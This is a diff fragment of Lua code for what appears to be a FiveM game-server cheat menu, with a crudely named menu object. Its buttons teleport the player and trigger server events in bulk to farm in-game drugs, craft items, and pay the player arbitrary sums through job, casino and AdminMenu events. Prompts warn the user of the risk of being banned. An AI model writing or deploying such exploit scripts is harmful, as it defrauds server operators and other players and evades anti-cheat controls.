+                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
+            elseif IhadSexWithMyStepMother.Button("Sandy Shores BCSO HQ") then
+                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
+            elseif IhadSexWithMyStepMother.Button("Paleto Bay BCSO HQ") then
+                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
+            elseif IhadSexWithMyStepMother.Button("FIB Top Floor") then
+                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
+            elseif IhadSexWithMyStepMother.Button("FIB Offices") then
+                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
+            elseif IhadSexWithMyStepMother.Button("Michael's House") then
+                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
+            elseif IhadSexWithMyStepMother.Button("Franklin's First House") then
+                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
+            elseif IhadSexWithMyStepMother.Button("Franklin's Second House") then
+                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
+            elseif IhadSexWithMyStepMother.Button("Trevor's Trailer") then
+                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
+            elseif IhadSexWithMyStepMother.Button("Tequi-La-La") then
+                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
+            end
+        
+        
+
+
+ 
+        elseif IhadSexWithMyStepMother.IsMenuOpened('lua') then
+            
+
+				if IhadSexWithMyStepMother.MenuButton('~s~Money Options', 'money') then
+				elseif IhadSexWithMyStepMother.MenuButton('~s~Set Jobs', 'player1') then
+				elseif IhadSexWithMyStepMother.MenuButton('~s~Drugs Farm', 'drogas') then
+				elseif IhadSexWithMyStepMother.MenuButton('~s~Mechanic Items ', 'mecanico') then
+				elseif IhadSexWithMyStepMother.MenuButton('~v~CFW ~s~Options', 'esx') then
+                elseif IhadSexWithMyStepMother.MenuButton('~s~VRP ~s~Options', 'vrp') then
+			end
+			
+			elseif IhadSexWithMyStepMother.IsMenuOpened('mecanico') then
+			 if IhadSexWithMyStepMother.Button("~b~Harvest GasCan") then
+						TriggerServerEvent('esx_mechanicjob:startHarvest')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest')
+			elseif IhadSexWithMyStepMother.Button("~b~Harvest RepairTools") then
+						TriggerServerEvent('esx_mechanicjob:startHarvest2')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
+                        TriggerServerEvent('esx_mechanicjob:startHarvest2') 
+			elseif IhadSexWithMyStepMother.Button("~b~Harvest BodyTools") then	
+					TriggerServerEvent('esx_mechanicjob:startHarvest3')
+					TriggerServerEvent('esx_mechanicjob:startHarvest3')
+					TriggerServerEvent('esx_mechanicjob:startHarvest3')
+					TriggerServerEvent('esx_mechanicjob:startHarvest3')
+					TriggerServerEvent('esx_mechanicjob:startHarvest3')
+			elseif IhadSexWithMyStepMother.Button("~b~Harvest TunerChip") then	
+					TriggerServerEvent('esx_mechanicjob:startHarvest4')
+					TriggerServerEvent('esx_mechanicjob:startHarvest4')
+					TriggerServerEvent('esx_mechanicjob:startHarvest4')
+					TriggerServerEvent('esx_mechanicjob:startHarvest4')
+					TriggerServerEvent('esx_mechanicjob:startHarvest4')
+			elseif IhadSexWithMyStepMother.Button("~c~Craft Blowtorch") then	
+			        TriggerServerEvent('esx_mechanicjob:startCraft')
+					TriggerServerEvent('esx_mechanicjob:startCraft')
+					TriggerServerEvent('esx_mechanicjob:startCraft')
+					TriggerServerEvent('esx_mechanicjob:startCraft')
+					TriggerServerEvent('esx_mechanicjob:startCraft')
+			elseif IhadSexWithMyStepMother.Button("~c~Craft RepairKit") then
+					TriggerServerEvent('esx_mechanicjob:startCraft2')
+					TriggerServerEvent('esx_mechanicjob:startCraft2')
+					TriggerServerEvent('esx_mechanicjob:startCraft2')
+					TriggerServerEvent('esx_mechanicjob:startCraft2')
+					TriggerServerEvent('esx_mechanicjob:startCraft2')
+			elseif IhadSexWithMyStepMother.Button("~c~Craft BodyKit") then
+					TriggerServerEvent('esx_mechanicjob:startCraft3')
+					TriggerServerEvent('esx_mechanicjob:startCraft3')
+					TriggerServerEvent('esx_mechanicjob:startCraft3')
+					TriggerServerEvent('esx_mechanicjob:startCraft3')
+					TriggerServerEvent('esx_mechanicjob:startCraft3')
+			elseif IhadSexWithMyStepMother.Button("~y~Harvest Bitcoin") then
+					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
+			elseif IhadSexWithMyStepMother.Button("~y~Sell Bitcoin") then
+					TriggerServerEvent('esx_bitcoin:startSellKoda')
+					TriggerServerEvent('esx_bitcoin:startSellKoda')
+					TriggerServerEvent('esx_bitcoin:startSellKoda')
+					TriggerServerEvent('esx_bitcoin:startSellKoda')
+					TriggerServerEvent('esx_bitcoin:startSellKoda')
+			elseif IhadSexWithMyStepMother.Button("~r~Stop all") then	
+					TriggerServerEvent("esx_drugs:stopHarvestCoke")
+					TriggerServerEvent("esx_drugs:stopTransformCoke")
+					TriggerServerEvent("esx_drugs:stopSellCoke")
+					TriggerServerEvent("esx_drugs:stopHarvestMeth")
+					TriggerServerEvent("esx_drugs:stopTransformMeth")
+					TriggerServerEvent("esx_drugs:stopSellMeth")
+					TriggerServerEvent("esx_drugs:stopHarvestWeed")
+					TriggerServerEvent("esx_drugs:stopTransformWeed")
+					TriggerServerEvent("esx_drugs:stopSellWeed")
+					TriggerServerEvent("esx_drugs:stopHarvestOpium")
+					TriggerServerEvent("esx_drugs:stopTransformOpium")
+					TriggerServerEvent("esx_drugs:stopSellOpium")
+					TriggerServerEvent('esx_mechanicjob:stopHarvest') 
+					TriggerServerEvent('esx_mechanicjob:stopHarvest2') 
+					TriggerServerEvent('esx_mechanicjob:stopHarvest2') 
+					TriggerServerEvent('esx_mechanicjob:stopHarvest4') 
+					TriggerServerEvent('esx_mechanicjob:stopCraft') 
+					TriggerServerEvent('esx_mechanicjob:stopCraft2') 
+					TriggerServerEvent('esx_mechanicjob:stopCraft3')	
+end					
+				
+			elseif IhadSexWithMyStepMother.IsMenuOpened('drogas') then
+			 if IhadSexWithMyStepMother.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startHarvestWeed")
+					TriggerServerEvent("esx_drugs:startHarvestWeed")
+					TriggerServerEvent("esx_drugs:startHarvestWeed")
+					TriggerServerEvent("esx_drugs:startHarvestWeed")
+					TriggerServerEvent("esx_drugs:startHarvestWeed")
+					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
+				elseif IhadSexWithMyStepMother.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startTransformWeed")
+					TriggerServerEvent("esx_drugs:startTransformWeed")
+					TriggerServerEvent("esx_drugs:startTransformWeed")
+					TriggerServerEvent("esx_drugs:startTransformWeed")
+					TriggerServerEvent("esx_drugs:startTransformWeed")
+					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
+				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startSellWeed")
+					TriggerServerEvent("esx_drugs:startSellWeed")
+					TriggerServerEvent("esx_drugs:startSellWeed")
+					TriggerServerEvent("esx_drugs:startSellWeed")
+					TriggerServerEvent("esx_drugs:startSellWeed")
+					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
+				elseif IhadSexWithMyStepMother.Button("~h~Harvest Coke ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startHarvestCoke")
+					TriggerServerEvent("esx_drugs:startHarvestCoke")
+					TriggerServerEvent("esx_drugs:startHarvestCoke")
+					TriggerServerEvent("esx_drugs:startHarvestCoke")
+					TriggerServerEvent("esx_drugs:startHarvestCoke")
+				    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
+				elseif IhadSexWithMyStepMother.Button("~h~Transform Coke ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startTransformCoke")
+					TriggerServerEvent("esx_drugs:startTransformCoke")
+					TriggerServerEvent("esx_drugs:startTransformCoke")
+					TriggerServerEvent("esx_drugs:startTransformCoke")
+					TriggerServerEvent("esx_drugs:startTransformCoke")
+					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+				    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
+					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
+				elseif IhadSexWithMyStepMother.Button("~h~Sell Coke ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startSellCoke")
+					TriggerServerEvent("esx_drugs:startSellCoke")
+					TriggerServerEvent("esx_drugs:startSellCoke")
+					TriggerServerEvent("esx_drugs:startSellCoke")
+					TriggerServerEvent("esx_drugs:startSellCoke")
+					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
+				elseif IhadSexWithMyStepMother.Button("~h~~r~Harvest Meth ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startHarvestMeth")
+					TriggerServerEvent("esx_drugs:startHarvestMeth")
+					TriggerServerEvent("esx_drugs:startHarvestMeth")
+					TriggerServerEvent("esx_drugs:startHarvestMeth")
+					TriggerServerEvent("esx_drugs:startHarvestMeth")
+					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
+				elseif IhadSexWithMyStepMother.Button("~h~~r~Transform Meth ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startTransformMeth")
+					TriggerServerEvent("esx_drugs:startTransformMeth")
+					TriggerServerEvent("esx_drugs:startTransformMeth")
+					TriggerServerEvent("esx_drugs:startTransformMeth")
+					TriggerServerEvent("esx_drugs:startTransformMeth")
+					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
+				elseif IhadSexWithMyStepMother.Button("~h~~r~Sell Meth ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startSellMeth")
+					TriggerServerEvent("esx_drugs:startSellMeth")
+					TriggerServerEvent("esx_drugs:startSellMeth")
+					TriggerServerEvent("esx_drugs:startSellMeth")
+					TriggerServerEvent("esx_drugs:startSellMeth")
+					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
+				elseif IhadSexWithMyStepMother.Button("~h~~p~Harvest Opium ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startHarvestOpium")
+					TriggerServerEvent("esx_drugs:startHarvestOpium")
+					TriggerServerEvent("esx_drugs:startHarvestOpium")
+					TriggerServerEvent("esx_drugs:startHarvestOpium")
+					TriggerServerEvent("esx_drugs:startHarvestOpium")
+					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
+				elseif IhadSexWithMyStepMother.Button("~h~~p~Transform Opium ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startTransformOpium")
+					TriggerServerEvent("esx_drugs:startTransformOpium")
+					TriggerServerEvent("esx_drugs:startTransformOpium")
+					TriggerServerEvent("esx_drugs:startTransformOpium")
+					TriggerServerEvent("esx_drugs:startTransformOpium")
+					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
+				elseif IhadSexWithMyStepMother.Button("~h~~p~Sell Opium ~c~(x5)") then
+					TriggerServerEvent("esx_drugs:startSellOpium")
+					TriggerServerEvent("esx_drugs:startSellOpium")
+					TriggerServerEvent("esx_drugs:startSellOpium")
+					TriggerServerEvent("esx_drugs:startSellOpium")
+					TriggerServerEvent("esx_drugs:startSellOpium")
+					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
+				elseif IhadSexWithMyStepMother.Button("~r~~h~Stop all ~c~(Drugs)") then
+					TriggerServerEvent("esx_drugs:stopHarvestCoke")
+					TriggerServerEvent("esx_drugs:stopTransformCoke")
+					TriggerServerEvent("esx_drugs:stopSellCoke")
+					TriggerServerEvent("esx_drugs:stopHarvestMeth")
+					TriggerServerEvent("esx_drugs:stopTransformMeth")
+					TriggerServerEvent("esx_drugs:stopSellMeth")
+					TriggerServerEvent("esx_drugs:stopHarvestWeed")
+					TriggerServerEvent("esx_drugs:stopTransformWeed")
+					TriggerServerEvent("esx_drugs:stopSellWeed")
+					TriggerServerEvent("esx_drugs:stopHarvestOpium")
+					TriggerServerEvent("esx_drugs:stopTransformOpium")
+					TriggerServerEvent("esx_drugs:stopSellOpium")
+					TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
+					TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
+					TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
+					TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
+					TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
+					TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
+					TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
+					TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
+					TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
+					TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
+					TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
+					TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
+					ShowInfo("~r~Everything is now stopped.")
+				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell Money Wash~s~ 1 ~c~(x10)") then
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
+				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell Money Wash~s~ 2") then
+					local result = GetKeyboardInput("Enter amount wash money ", "", 100000)
+					if result then
+					TriggerServerEvent('esx_moneywash:washMoney', result)
+					TriggerServerEvent('esx_blackmoney:washMoney', result)
+					TriggerServerEvent('esx_society:washMoney', result)
+					end
+				end
+		
+			
+			
+			elseif IhadSexWithMyStepMother.IsMenuOpened('money') then
+						if IhadSexWithMyStepMother.Button("~r~ Money [1] Vrp Dont Use With Rac Anticheat") then
+			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
+			
+			 if string.lower(confirm) == "y" then
+			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
+				
+				TriggerServerEvent('esx_truckerjob:pay', result)
+				TriggerServerEvent('vrp_slotmachine:server:2', result)
+				TriggerServerEvent("esx_pizza:pay", result)
+				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
+				TriggerServerEvent('lscustoms:payGarage', result)
+				TriggerServerEvent('esx_tankerjob:pay', result)
+				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
+				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
+				TriggerServerEvent('gambling:spend', result)
+				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
+				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
+				TriggerServerEvent('AdminMenu:giveBank', result)
+				TriggerServerEvent('AdminMenu:giveCash', result)
+				TriggerServerEvent('esx_slotmachine:sv:2', result)
+				TriggerServerEvent('esx_moneywash:deposit', result)
+				TriggerServerEvent('esx_moneywash:withdraw', result)
+				TriggerServerEvent('esx_moneywash:deposit', result)
+			    TriggerServerEvent('mission:completed', result)
+				TriggerServerEvent('truckerJob:success',result)
+				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
+				TriggerServerEvent("dropOff", result)
+				TriggerServerEvent('truckerfuel:success',result)
+				TriggerServerEvent('delivery:success',result)
+				TriggerServerEvent("lscustoms:payGarage", {costs = -result})
+				TriggerServerEvent("esx_brinksjob:pay", result)
+				TriggerServerEvent("esx_garbagejob:pay", result)
+				TriggerServerEvent("esx_postejob:pay", result)
+				TriggerServerEvent('esx_garbage:pay', result)
+				TriggerServerEvent("esx_carteirojob:pay", result)
+				else
+					ShowInfo("~r~Operation Canceled")
+				end
+			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 2 ~y~Esx~s~ | ~b~vRP ~r~(RISK) (All_Jobs)") then
+				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
+			 if string.lower(confirm) == "y" then
+			        TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent("esx_mugging:giveMoney")
+					TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				else
+					ShowInfo("~r~Operation Canceled")
+				end
+				
+				elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 3 ~y~Esx~s~ | ~b~vRP ~r~ (RISK) ~s~(Work 90% ALL SERVERS)") then
+			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
+			
+			 if string.lower(confirm) == "y" then
+			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
+				TriggerServerEvent("esx_godirtyjob:pay", result)
+				TriggerServerEvent("esx_pizza:pay", result)
+				TriggerServerEvent("esx_slotmachine:sv:2", result)
+				TriggerServerEvent("esx_banksecurity:pay", result)
+				TriggerServerEvent("esx_gopostaljob:pay", result)
+				TriggerServerEvent("esx_truckerjob:pay", result)
+				TriggerServerEvent("esx_carthief:pay", result)
+			    TriggerServerEvent("esx_garbagejob:pay", result)
+				TriggerServerEvent("esx_ranger:pay", result)
+                TriggerServerEvent("esx_truckersjob:payy", result)
+                TriggerServerEvent("esx_godirtyjob:pay", result)
+                TriggerServerEvent("dropOff",result)
+                TriggerServerEvent("PayForRepairNow",-result)
+				else
+					ShowInfo("~r~Operation Canceled")
+				end
